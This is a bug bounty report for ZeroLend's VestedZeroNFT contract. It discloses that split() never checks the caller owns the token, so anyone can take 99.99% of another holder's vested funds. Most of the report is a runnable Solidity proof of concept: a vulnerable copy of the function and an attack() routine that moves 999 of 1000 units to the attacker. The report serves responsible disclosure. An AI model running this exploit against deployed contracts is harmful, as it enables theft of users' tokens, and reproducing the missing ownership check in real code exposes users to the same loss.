# 29031 - \[SC - Critical] VestedZeroNFT tokens can be directly stolen thr...

Submitted on Mar 5th 2024 at 03:07:39 UTC by @Trust for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29031

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The split() function of VestedZeroNFT allows a user to split a tokenId to two tokens, using the desired ratio. VestedZeroNFT is a vesting solution, allowing anyone to mint a vesting token who will eventually emit the entire locked funds.

## Vulnerability Details

The `split()` function lacks access-control check - essentially that the msg.sender is the owner of `tokenID`. The `msg.sender` is the one receiving the newly minted token with an arbitrary ratio. `_mint(msg.sender, ++lastTokenId);` This means anyone can pass an existing tokenID and `fraction=1` to still 99.99% of the value of a token.

## Impact Details

Anyone can steal the underlying value of vestedZeroNFTs

## Proof of concept

Since the project's test suite does not run, as indicated in chat, I've prepped a POC as a standalone contract which directly copies the `split()` function from VestedZeroNFT.

Simply deploy the SplitStealPOC contract and run `attack()` which proves anyone can steal another person's holdings.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC165, ERC721Upgradeable, ERC721EnumerableUpgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721EnumerableUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {ERC20} from  "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVestedZeroNFT{
    function split( uint256 tokenId, uint256 fraction) external;
    function mint( address _who, uint256 _pending, uint256 _upfront, uint256 _linearDuration, uint256 _cliffDuration, uint256 _unlockDate, bool _hasPenalty, VestCategory _category) external returns (uint256);
    function init(address _zero, address _stakingBonus) external;
}

enum VestCategory {
    PRIVATE_SALE,
    EARLY_ZERO,
    NORMAL,
    AIRDROP
}

struct LockDetails {
    uint256 cliffDuration;
    uint256 unlockDate;
    uint256 pendingClaimed;
    uint256 pending;
    uint256 upfrontClaimed;
    uint256 upfront;
    uint256 linearDuration;
    uint256 createdAt;
    bool hasPenalty;
    VestCategory category;
}

contract Zero is ERC20 {
    constructor() ERC20("Zero","ZRO") {
        _mint(msg.sender, 100_000 * 1e18);
    }
}

contract VestedZeroNFT is ERC721EnumerableUpgradeable {
    function init(address _zero, address _stakingBonus) external initializer {
    __ERC721_init("ZeroLend Vest", "ZEROv");
    denominator = 10000;
    zero = IERC20(_zero);
    }

    mapping(uint256 => bool) public frozen;
    uint256 public denominator;
    mapping(uint256 => LockDetails) public tokenIdToLockDetails;
    uint256 public lastTokenId;
    IERC20 public zero;

    function split(
        uint256 tokenId,
        uint256 fraction
    ) external {
        _requireOwned(tokenId);
        require(fraction > 0 && fraction < denominator, "!fraction");
        require(!frozen[tokenId], "frozen");
        LockDetails memory lock = tokenIdToLockDetails[tokenId];
        uint256 splitPendingAmount = (lock.pending * fraction) / denominator;
        uint256 splitUpfrontAmount = (lock.upfront * fraction) / denominator;
        uint256 splitUnlockedPendingAmount = (lock.pendingClaimed * fraction) /
            denominator;
        uint256 splitUnlockedUpfrontAmount = (lock.upfrontClaimed * fraction) /
            denominator;
        tokenIdToLockDetails[tokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: lock.createdAt,
            linearDuration: lock.linearDuration,
            pending: splitPendingAmount,
            pendingClaimed: splitUnlockedPendingAmount,
            upfrontClaimed: splitUnlockedUpfrontAmount,
            upfront: splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
        _mint(msg.sender, ++lastTokenId);
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: block.timestamp,
            linearDuration: lock.linearDuration,
            pending: lock.pending - splitPendingAmount,
            pendingClaimed: lock.pendingClaimed - splitUnlockedPendingAmount,
            upfrontClaimed: lock.upfrontClaimed - splitUnlockedUpfrontAmount,
            upfront: lock.upfront - splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
    }

    function getTokenIdToLockDetails(uint256 a) external returns (LockDetails memory)  {
        return tokenIdToLockDetails[a];
    }

    function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) {
        _mint(_who, ++lastTokenId);
        if (_unlockDate == 0) _unlockDate = block.timestamp;
        require(_unlockDate >= block.timestamp, "invalid _unlockDate");
        if (_hasPenalty) {
            require(_upfront == 0, "no upfront when there is a penalty");
            require(_cliffDuration == 0, "no cliff when there is a penalty");
        }
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: _cliffDuration,
            unlockDate: _unlockDate,
            pendingClaimed: 0,
            upfrontClaimed: 0,
            pending: _pending,
            hasPenalty: _hasPenalty,
            upfront: _upfront,
            linearDuration: _linearDuration,
            createdAt: block.timestamp,
            category: _category
        });
        // fund the contract
        zero.transferFrom(msg.sender, address(this), _pending + _upfront);
        return lastTokenId;
    }

}


contract SplitStealPOC {

    IERC20 zero;
    VestedZeroNFT nft;

    constructor() {
        zero = new Zero();
        nft = new VestedZeroNFT();
        nft.init(address(zero), address(0));        
    }

    function attack() external {
        zero.approve(address(nft), type(uint256).max);
        nft.mint(address(0x1111), 1000, 1000, 100, 100, block.timestamp, false, VestCategory.EARLY_ZERO); // uint256 _pending, uint256 _upfront, uint256 _linearDuration, uint256 _cliffDuration, uint256 _unlockDate, bool _hasPenalty, VestCategory _category) 

        require(nft.ownerOf(1) == address(0x1111));

        nft.split(1, 10);

        require(nft.ownerOf(2) == address(this));
        LockDetails memory l1 = nft.getTokenIdToLockDetails(1);
        LockDetails memory l2 = nft.getTokenIdToLockDetails(2);
        require(l1.pending == 1);
        require(l2.pending == 999);
    }
}

```
